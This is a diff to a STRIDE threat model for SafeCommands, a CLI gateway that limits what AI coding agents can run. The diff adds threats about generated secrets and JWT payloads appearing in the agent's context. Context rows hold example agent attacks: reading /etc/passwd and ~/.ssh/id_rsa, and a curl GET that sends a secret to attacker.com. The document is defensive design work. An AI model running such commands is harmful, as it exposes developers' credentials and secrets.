@@ -4,7 +4,7 @@
 
 ### Application Description
 
-SafeCommands is a .NET 8 CLI tool (`safe`) that acts as a safe command gateway for AI coding agents. It provides 146+ pre-validated commands across 11 groups, allowing AI agents to execute CLI operations without per-command user approval. The tool runs as a NuGet global tool on the developer's workstation.
+SafeCommands is a .NET 8 CLI tool (`safe`) that acts as a safe command gateway for AI coding agents. It provides 160+ pre-validated commands across 12 groups, allowing AI agents to execute CLI operations without per-command user approval. The tool runs as a NuGet global tool on the developer's workstation.
 
 ### User Types
 
@@ -112,11 +112,14 @@ SafeCommands is a .NET 8 CLI tool (`safe`) that acts as a safe command gateway f
 | I2 | File read outside project directory | Agent calls `safe file read /etc/passwd` or `safe file read ~/.ssh/id_rsa` to read sensitive files | 1 | 3 | 3 | **Fully mitigated.** All file operations sandboxed to CWD via `ValidatePath()`. Paths resolved via `Path.GetFullPath()` before boundary check. |
 | I3 | Process output contains secrets | `safe git log`, `safe docker logs`, or proxy commands return output containing accidentally committed secrets | 2 | 2 | 4 | **Accepted risk.** Output pass-through is by design. Users should use git-secrets or similar pre-commit tools. |
 | I4 | Data exfiltration via curl URL | Agent calls `safe proxy curl https://attacker.com?secret=value` to send data via GET URL parameters | 2 | 3 | 6 | **Partially mitigated.** POST/PUT/DELETE blocked, but GET with query params can exfiltrate data. URL validation not implemented. |
+| I5 | Generated secrets exposed in agent context | Agent calls `safe generate secret` or `safe generate password` and the value appears in chat/logs. Secrets never reach a secure store — they exist only in stdout. | 3 | 2 | 6 | **Accepted by design.** The agent explicitly requested the value for use in config scaffolding, test fixtures, etc. Users should rotate any generated secret used in production. |
+| I6 | JWT payload disclosure via jwt-decode | Agent decodes a JWT containing PII or sensitive claims, exposing the payload in chat context | 2 | 2 | 4 | **Accepted by design.** Agent explicitly requested decode. No signature verification is performed — this is inspection, not authentication. |
 
 **Countermeasures:**
 - I1: Expand secret patterns or switch to allowlist approach for env vars
 - I2: Future: add project-directory sandboxing for file operations
 - I4: Consider URL allowlisting or domain restrictions for curl proxy
+- I5: Document that generated secrets are visible in agent conversation and should be rotated if used in production
 
 ### D - Denial of Service
 
@@ -161,6 +164,7 @@ SafeCommands is a .NET 8 CLI tool (`safe`) that acts as a safe command gateway f
 | D2 | Long-running processes | Expected for dev workflows (`run`, `watch`, `serve`) |
 | E4 | Privilege inheritance | Standard CLI behavior, document the risk |
 | I3 | Process output may contain secrets | Pass-through is by design, use pre-commit secret scanning |
+| I5 | Generated secrets visible in agent context | By design — agents need the value. Rotate secrets used in production. |
 
 ## Security Controls Summary
 
@@ -174,6 +178,7 @@ SafeCommands is a .NET 8 CLI tool (`safe`) that acts as a safe command gateway f
 | **Process Safety** | Kill restricted to dev-tooling allowlist |
 | **Docker Safety** | Volume deletion blocked, compose-down `-v` blocked |
 | **Package Manager Safety** | Supply chain warnings on install, script allowlist, `audit fix --force` blocked |
+| **Generate Safety** | All generate commands are read-only pure computation. `hash-file` sandboxed to project directory. No external process execution. |
 | **Proxy Validation** | Per-tool subcommand allowlist, curl restricted to GET/HEAD |
 | **Secret Masking** | Environment variable secret pattern matching (blocklist) |
 | **CI/CD Security** | OIDC trusted publishing, no stored API keys, tag-triggered only |
@@ -184,6 +189,7 @@ SafeCommands is a .NET 8 CLI tool (`safe`) that acts as a safe command gateway f
 | Version | Date | Reviewer | Changes |
 |---------|------|----------|---------|
 | v1 | 2026-04-04 | STRIDE analysis (initial) | Initial threat model covering 146 commands across 11 groups |
+| v2 | 2026-04-04 | STRIDE update (generate group) | Added I5, I6 for generate commands. Updated to 160 commands across 12 groups. |
 
 ## References
 
